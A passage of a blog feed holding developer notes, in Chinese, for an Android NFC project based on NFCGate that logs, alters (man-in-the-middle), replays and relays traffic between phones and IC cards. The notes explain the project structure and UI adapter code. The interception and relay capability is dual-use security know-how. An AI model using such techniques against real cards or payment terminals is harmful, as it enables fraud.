rel="noopener">100个gdb小技巧</a></p><p><a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（上）</a></p><p><a href="http://www.cnblogs.com/clover-toeic/p/3755401.html" target="_blank" rel="noopener">C语言函数调用栈(一)</a></p><p><a href="http://www.cnblogs.com/clover-toeic/p/3756668.html" target="_blank" rel="noopener">C语言函数调用栈(二)</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack_intro/" target="_blank" rel="noopener">栈介绍-CTF-wiki</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;实现栈溢出的两个条件:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;程序有向栈写入数据的行为&lt;/li&gt;
&lt;li&gt;程序并不限制写入数据的长度&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://www.killshadow.xyz/tags/CTF/"/>
    
      <category term="PWN" scheme="http://www.killshadow.xyz/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>NFC开发笔记</title>
    <link href="http://www.killshadow.xyz/2018/09/09/NFC%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"/>
    <id>http://www.killshadow.xyz/2018/09/09/NFC开发笔记/</id>
    <published>2018-09-08T16:00:00.000Z</published>
    <updated>2018-10-25T06:45:45.507Z</updated>
    
    <content type="html"><![CDATA[<h2 id="x00-概述">0x00 概述</h2><blockquote><p>在正式开始介绍项目前，我想先介绍一下背景及一些废话，方便大家能够更好理解这个项目。这个项目起初是为了能够更好地抓取手机与IC卡之间的交互数据，以及对抓取的数据进行分析。<a id="more"></a>后来在抓取数据过程当中，希望能够实现某些数据的替换（中间人）、重放、中继，以此展开了一系列的功能扩展。此外，对于数据提取这一块，也做了一些专门的优化，如：在Log中发送数据到HCE模块或者到MitM模块。文章的最后还会对希望扩展的功能进一步分析。我暂且把这个项目的整体设计模式称为：VNNC模式（View Network NFC Control，可以简单理解为MVC模式），对应的包如下图。为了加速apdu数据流的数据传输，我们还增加了多线程功能，这个方式将数据的SQLite存储与apdu数据流分离在不同线程，以保证高效、有序地对数据操作。这个设计模式是鄙人自命名的，如有纰漏，请指正。以下会对整个项目进行解释，以方便接管项目者快速理解整个项目，少走一些弯路。</p></blockquote><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── tud</span><br><span class="line">    └── seemuh</span><br><span class="line">        └── nfcgate</span><br><span class="line">            ├── gui</span><br><span class="line">            │   ├── AboutActivity.java</span><br><span class="line">            │   ├── AboutWorkaroundActivity.java</span><br><span class="line">            │   ├── adapter</span><br><span class="line">            │   │   ├── ListViewAdapter.java</span><br><span class="line">            │   │   ├── MitmItemAdapter.java</span><br><span class="line">            │   │   └── MulAdapter.java</span><br><span class="line">            │   ├── EditActivity.java</span><br><span class="line">            │   ├── fragments</span><br><span class="line">            │   │   ├── CloneFragment.java</span><br><span class="line">            │   │   ├── EnablenfcDialog.java</span><br><span class="line">            │   │   ├── HceFragment.java</span><br><span class="line">            │   │   ├── LoggingDetailFragment.java</span><br><span class="line">            │   │   ├── LoggingFragment.java</span><br><span class="line">            │   │   ├── MitmFragment.java</span><br><span class="line">            │   │   ├── RelayFragment.java</span><br><span class="line">            │   │   ├── SettingsFragment.java</span><br><span class="line">            │   │   ├── TokenDialog.java</span><br><span class="line">            │   │   └── WorkaroundDialog.java</span><br><span class="line">            │   ├── LogActivity.java</span><br><span class="line">            │   ├── LoggingDetailActivity.java</span><br><span class="line">            │   ├── MainActivity.java</span><br><span class="line">            │   ├── MitmActivity.java</span><br><span class="line">            │   ├── RuleActivity.java</span><br><span class="line">            │   ├── SettingsActivity.java</span><br><span class="line">            │   ├── Splash.java</span><br><span class="line">            │   ├── tabLayout</span><br><span class="line">            │   │   ├── SlidingTabLayout.java</span><br><span class="line">            │   │   └── SlidingTabStrip.java</span><br><span class="line">            │   └── tabLogic</span><br><span class="line">            │       └── PagerAdapter.java</span><br><span class="line">            ├── network</span><br><span class="line">            │   ├── c2c</span><br><span class="line">            │   │   └── C2C.java</span><br><span class="line">            │   ├── c2s</span><br><span class="line">            │   │   └── C2S.java</span><br><span class="line">            │   ├── Callback.java</span><br><span class="line">            │   ├── HighLevelNetworkHandler.java</span><br><span class="line">            │   ├── HighLevelProtobufHandler.java</span><br><span class="line">            │   ├── LowLevelNetworkHandler.java</span><br><span class="line">            │   ├── LowLevelTCPHandler.java</span><br><span class="line">            │   ├── meta</span><br><span class="line">            │   │   └── MetaMessage.java</span><br><span class="line">            │   └── ProtobufCallback.java</span><br><span class="line">            ├── nfc</span><br><span class="line">            │   ├── config</span><br><span class="line">            │   │   ├── ConfigBuilder.java</span><br><span class="line">            │   │   ├── ConfigOption.java</span><br><span class="line">            │   │   ├── OptionType.java</span><br><span class="line">            │   │   └── Technologies.java</span><br><span class="line">            │   ├── hce</span><br><span class="line">            │   │   ├── ApduService.java</span><br><span class="line">            │   │   ├── DaemonConfiguration.java</span><br><span class="line">            │   │   └── PaymentServiceHost.java</span><br><span class="line">            │   ├── NfcManager.java</span><br><span class="line">            │   └── reader</span><br><span class="line">            │       ├── DesfireWorkaround.java</span><br><span class="line">            │       ├── IsoDepReader.java</span><br><span class="line">            │       ├── NfcAReader.java</span><br><span class="line">            │       ├── NfcBReader.java</span><br><span class="line">            │       ├── NfcFReader.java</span><br><span class="line">            │       ├── NFCTagEmulator.java</span><br><span class="line">            │       ├── NFCTagReader.java</span><br><span class="line">            │       └── NfcVReader.java</span><br><span class="line">            └── util</span><br><span class="line">                ├── CustomTextWatcher.java</span><br><span class="line">                ├── db</span><br><span class="line">                │   ├── CloneListItem.java</span><br><span class="line">                │   ├── CloneListStorage.java</span><br><span class="line">                │   ├── DbInitTask.java</span><br><span class="line">                │   ├── RuleListItem.java</span><br><span class="line">                │   ├── RuleListStorage.java</span><br><span class="line">                │   ├── SessionLoggingContract.java</span><br><span class="line">                │   └── SessionLoggingDbHelper.java</span><br><span class="line">                ├── filter</span><br><span class="line">                │   ├── action</span><br><span class="line">                │   │   ├── Action.java</span><br><span class="line">                │   │   ├── ActionSequence.java</span><br><span class="line">                │   │   ├── Append.java</span><br><span class="line">                │   │   ├── InsertBytes.java</span><br><span class="line">                │   │   ├── ReplaceBytes.java</span><br><span class="line">                │   │   ├── ReplaceContent.java</span><br><span class="line">                │   │   └── Truncate.java</span><br><span class="line">                │   ├── conditional</span><br><span class="line">                │   │   ├── All.java</span><br><span class="line">                │   │   ├── And.java</span><br><span class="line">                │   │   ├── Conditional.java</span><br><span class="line">                │   │   ├── EndsWith.java</span><br><span class="line">                │   │   ├── Equals.java</span><br><span class="line">                │   │   ├── Length.java</span><br><span class="line">                │   │   ├── Not.java</span><br><span class="line">                │   │   ├── Or.java</span><br><span class="line">                │   │   ├── StartsWith.java</span><br><span class="line">                │   │   └── Xor.java</span><br><span class="line">                │   ├── FilterInitException.java</span><br><span class="line">                │   ├── Filter.java</span><br><span class="line">                │   └── FilterManager.java</span><br><span class="line">                ├── ItemBean.java</span><br><span class="line">                ├── MitmComm.java</span><br><span class="line">                ├── NfcComm.java</span><br><span class="line">                ├── NfcSession.java</span><br><span class="line">                ├── preference</span><br><span class="line">                │   └── IntEditTextPreference.java</span><br><span class="line">                ├── ReadLoadedSo.java</span><br><span class="line">                ├── RootManager.java</span><br><span class="line">                ├── RuleMatching.java</span><br><span class="line">                ├── sink</span><br><span class="line">                │   ├── FileSink.java</span><br><span class="line">                │   ├── SessionLoggingSink.java</span><br><span class="line">                │   ├── SinkInitException.java</span><br><span class="line">                │   ├── Sink.java</span><br><span class="line">                │   ├── SinkManager.java</span><br><span class="line">                │   └── TextViewSink.java</span><br><span class="line">                ├── UpdateUI.java</span><br><span class="line">                └── Utils.java</span><br></pre></td></tr></table></figure><h2 id="x01-视图模块之fragmentactivity">0x01 视图模块之Fragment/Activity</h2><h3 id="adapter">Ⅰ. adapter</h3><p>adapter包里又有三个细分的adapter，分别是：<code>ListViewAdapter</code>、<code>MitmItemAdapter</code>、<code>MulAdapter</code>。</p><h4 id="listviewadapter">1. ListViewAdapter</h4><p>这个Adapter主要是用在<code>HCE</code>模块中的列表的Item，每个Item包含两个<code>EditText</code>和一个<code>Button</code>, 为了能够更好管理<code>EditText</code>和一个<code>Button</code>的相关性, 而增加了这个adapter(适配器). 主要代码如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> View <span class="title">getView</span><span class="params">(<span class="keyword">final</span> <span class="keyword">int</span> position, View convertView, ViewGroup parent)</span> </span>&#123;</span><br><span class="line">      ViewHolder holder = <span class="keyword">null</span>;</span><br><span class="line">      <span class="keyword">if</span> (convertView == <span class="keyword">null</span>) &#123;</span><br><span class="line">          convertView = LayoutInflater.from(mContext).inflate(R.layout.item_hce_edittext, <span class="keyword">null</span>);</span><br><span class="line">          holder = <span class="keyword">new</span> ViewHolder(convertView);</span><br><span class="line">          convertView.setTag(holder);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          holder = (ViewHolder) convertView.getTag();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> ItemBean itemObj = mData.get(position);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//This is important. Remove TextWatcher first.</span></span><br><span class="line">      <span class="keyword">if</span> (holder.editText1.getTag() <span class="keyword">instanceof</span> TextWatcher) &#123;</span><br><span class="line">          holder.editText1.removeTextChangedListener((TextWatcher) holder.editText1.getTag());</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">// 设置读卡器的命令</span></span><br><span class="line">      holder.editText1.setText(itemObj.getReader());</span><br><span class="line">      holder.bt.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">              mData.remove(position);</span><br><span class="line">              <span class="keyword">if</span>(Utils.RuleOrTable)&#123;</span><br><span class="line">                  Utils.currentRule.remove(itemObj.getReader());</span><br><span class="line">                  Utils.ruleAdapter.notifyDataSetChanged();</span><br><span class="line">              &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                  Utils.currentMap.remove(itemObj.getReader());</span><br><span class="line">                  Utils.tableAdapter.notifyDataSetChanged();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      TextWatcher watcher = <span class="keyword">new</span> TextWatcher() &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">beforeTextChanged</span><span class="params">(CharSequence s, <span class="keyword">int</span> start, <span class="keyword">int</span> count, <span class="keyword">int</span> after)</span> </span>&#123;</span><br><span class="line">              oldString=s.toString();</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTextChanged</span><span class="params">(CharSequence s, <span class="keyword">int</span> start, <span class="keyword">int</span> before, <span class="keyword">int</span> count)</span> </span>&#123;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterTextChanged</span><span class="params">(Editable s)</span> </span>&#123;</span><br><span class="line">              <span class="keyword">if</span> (TextUtils.isEmpty(s)) &#123;</span><br><span class="line">                  itemObj.setReader(<span class="string">""</span>);</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  itemObj.setReader(s.toString());</span><br><span class="line">                  <span class="keyword">if</span>(Utils.RuleOrTable)&#123;</span><br><span class="line">                      Utils.currentRule=Utils.ChangeReader(Utils.currentRule,oldString,s.toString());</span><br><span class="line">                  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                      Utils.currentMap=Utils.ChangeReader(Utils.currentMap,oldString,s.toString());</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line">      holder.editText1.addTextChangedListener(watcher);</span><br><span class="line">      holder.editText1.setTag(watcher);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="comment">//This is important. Remove TextWatcher first.</span></span><br><span class="line">      <span class="keyword">if</span> (holder.editText2.getTag() <span class="keyword">instanceof</span> TextWatcher) &#123;</span><br><span class="line">          holder.editText2.removeTextChangedListener((TextWatcher) holder.editText2.getTag());</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      holder.editText2.setText(itemObj.getCard());</span><br><span class="line"></span><br><span class="line">      TextWatcher watcher2 = <span class="keyword">new</span> TextWatcher() &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">beforeTextChanged</span><span class="params">(CharSequence s, <span class="keyword">int</span> start, <span class="keyword">int</span> count, <span class="keyword">int</span> after)</span> </span>&#123;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTextChanged</span><span class="params">(CharSequence s, <span class="keyword">int</span> start, <span class="keyword">int</span> before, <span class="keyword">int</span> count)</span> </span>&#123;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterTextChanged</span><span class="params">(Editable s)</span> </span>&#123;</span><br><span class="line">              <span class="keyword">if</span> (TextUtils.isEmpty(s)) &#123;</span><br><span class="line">                  itemObj.setCard(<span class="string">""</span>);</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  itemObj.setCard(s.toString());</span><br><span class="line"></span><br><span class="line">                  <span class="keyword">if</span>(Utils.RuleOrTable)&#123;</span><br><span class="line">                      Utils.currentRule=Utils.ChangeCard(Utils.currentRule,itemObj.getReader(),s.toString());</span><br><span class="line">                  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                      Utils.currentMap=Utils.ChangeCard(Utils.currentMap,itemObj.getReader(),s.toString());</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line">      holder.editText2.addTextChangedListener(watcher2);</span><br><span class="line">      holder.editText2.setTag(watcher2);</span><br><span class="line">      <span class="keyword">return</span> convertView;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>重写<code>getView</code>方法可以从视图中获取当前的ListItem, 并对ListItem进行约束. 上面代码段可看到有个一<code>TextWatcher</code>方法, 这个方法将在<code>CustomTextWatcher.java</code>详细解释.</p><h4 id="mitmitemadapter">2. MitmItemAdapter</h4><p>这应该是该项目中最复杂的<code>Adapter</code>了, 其中每个Item包含四个<code>Button</code>, 三个<code>TextView</code>, 对应每个<code>Button</code>都有对应的<code>OnclickListener</code> , 根据选中的<code>Button</code>的<code>id</code>来<code>switch</code>, 对应代码如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">View.OnClickListener mOnClickListener = <span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (itemDisable) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (itemButtons) &#123;</span><br><span class="line">                RuleListStorage db = <span class="keyword">new</span> RuleListStorage(mContext);</span><br><span class="line">                List&lt;RuleListItem&gt; items = db.getAll();</span><br><span class="line">                <span class="keyword">switch</span> (v.getId()) &#123;</span><br><span class="line">                    <span class="keyword">case</span> R.id.mitm_list_btn_exec_card:</span><br><span class="line">                        ...</span><br><span class="line">                    <span class="keyword">case</span> R.id.mitm_list_btn_exec_reader:</span><br><span class="line">                        ...</span><br><span class="line">                    <span class="keyword">case</span> R.id.mitm_list_btn_edit:</span><br><span class="line">                        ...</span><br><span class="line">                    <span class="keyword">case</span> R.id.mitm_list_btn_delete:</span><br><span class="line">                        ...</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如上示代码, <code>v.getId</code>方法对应每个<code>Button</code>的id, 而四个<code>Button</code>都有对<code>RuleListStorage</code>操作, 具体SQLite的介绍在后面会详细解释. 值得注意的是, 上示代码段中引用了两个<code>sychronized</code>, 是为了各个Item在滑动过程中, 保持状态<code>button.setEnable(boolean)</code>. item的状态之所以会发生改变, 是因为adapter的缓存和预浏览机制. 具体原因请google: ArrayAdapter 滑动item状态发生改变.</p><p>这里想要细讲的是关于<code>AlertDialog</code>的使用, 这里都是围绕着<code>etBuilder</code>来建立的. <code>AlertDialog</code>的作用是设置一个弹框, 然后把xml对应的组件设置进去. 如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">AlertDialog.Builder etBuilder = <span class="keyword">new</span> AlertDialog.Builder(mContext);</span><br><span class="line"><span class="keyword">final</span> View view = LayoutInflater.from(mContext).inflate(R.layout.dialog_mitm_comm_setting, <span class="keyword">null</span>);</span><br><span class="line"><span class="keyword">final</span> EditText etName = view.findViewById(R.id.mitm_setting_comm_name);</span><br><span class="line"><span class="keyword">final</span> EditText etReader = view.findViewById(R.id.mitm_setting_reader_comm);</span><br><span class="line"><span class="keyword">final</span> EditText etCard = view.findViewById(R.id.mitm_setting_card_comm);</span><br><span class="line">etReader.addTextChangedListener(<span class="keyword">new</span> CustomTextWatcher(etReader));</span><br><span class="line">etCard.addTextChangedListener(<span class="keyword">new</span> CustomTextWatcher(etCard));</span><br><span class="line">etName.setText(mList.get(position).getName());</span><br><span class="line">etReader.setText(Utils.bytesToHex(mList.get(position).getReaderComm().getData()));</span><br><span class="line">etCard.setText(Utils.bytesToHex(mList.get(position).getCardComm().getData()));</span><br><span class="line">etBuilder.setTitle(<span class="string">"Edit Rule"</span>)</span><br><span class="line">    .setView(view)</span><br><span class="line">    .setCancelable(<span class="keyword">true</span>)</span><br><span class="line">    .setPositiveButton(<span class="string">"Save"</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">            <span class="comment">// get data from user, then storage in database</span></span><br><span class="line">            String name = etName.getText().toString();</span><br><span class="line">            String reader = etReader.getText().toString().replace(<span class="string">" "</span>, <span class="string">""</span>);</span><br><span class="line">            String card = etCard.getText().toString().replace(<span class="string">" "</span>, <span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (name.length() == <span class="number">0</span>) &#123;</span><br><span class="line">                Toast.makeText(mContext, <span class="string">"Please input command Function!"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!Utils.isHex(mContext, reader) &amp;&amp; Utils.isHex(mContext, card)) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// save in database</span></span><br><span class="line">            RuleListItem ruleListItem = <span class="keyword">new</span> RuleListItem(</span><br><span class="line">                mList.get(position).getId(),</span><br><span class="line">                name,</span><br><span class="line">                <span class="keyword">new</span> NfcComm(NfcComm.Source.HCE, Utils.toBytes(reader)),</span><br><span class="line">                <span class="keyword">new</span> NfcComm(NfcComm.Source.CARD, Utils.toBytes(card))</span><br><span class="line">            );</span><br><span class="line">            RuleListStorage mRuleDb = <span class="keyword">new</span> RuleListStorage(mContext);</span><br><span class="line">            mRuleDb.update(ruleListItem);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// refreshList for list item view</span></span><br><span class="line">            MitmFragment.getInstance().refreshList();</span><br><span class="line"></span><br><span class="line">            notifyDataSetChanged();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// show toast</span></span><br><span class="line">            Toast.makeText(mContext, <span class="string">"Save Successfully!"</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">            dialog.dismiss();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">etBuilder.setNegativeButton(<span class="string">"Cancel"</span>, <span class="keyword">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span> </span>&#123;</span><br><span class="line">        dialog.dismiss();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">etBuilder.create();</span><br><span class="line">etBuilder.show();</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><h4 id="muladapter">3. MulAdapter</h4><p>这个<code>Adapter</code>比较简单, 只有<code>CheckBox</code>和<code>TextView</code>, 要注意的是, <code>CheckBox</code>在<code>ListView</code>中滑动时, 被勾选的状态也会发生改变(选中之后, 下滑返回选中状态就消失, 原因是<code>public View getView(int position, View convertView, ViewGroup parent)</code>传进来的<code>convertView</code>被多次重用), 这就需要用额外的方法保持被勾选的状态. 解决办法是用<code>HashMap</code>来保存<code>CheckBox</code>的状态值:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> HashMap&lt;Integer,Boolean&gt; isSelected = <span class="keyword">new</span> HashMap&lt;Integer, Boolean&gt;();</span><br></pre></td></tr></table></figure><p>如下方法是从<code>Fragment</code>中传入list之后, 根据list的状态设置<code>CheckBox</code>选中状态.可以视为初始化<code>CheckBox</code>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 